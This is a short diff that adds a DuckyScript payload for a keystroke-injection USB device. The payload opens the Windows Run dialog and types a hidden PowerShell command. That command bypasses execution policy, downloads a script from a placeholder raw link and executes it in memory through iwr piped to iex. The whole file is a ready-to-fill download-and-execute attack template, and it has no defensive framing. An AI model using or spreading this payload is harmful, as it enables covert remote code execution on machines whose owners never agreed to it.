@@ -1,0 +1,6 @@
+REM Execute PowerShell to download and run a script from GitHub
+DEFAULT_DELAY 300
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& {iwr -useb 'PASTE_YOUR_RAW_LINK_HERE.ps1' | iex}"
+ENTER
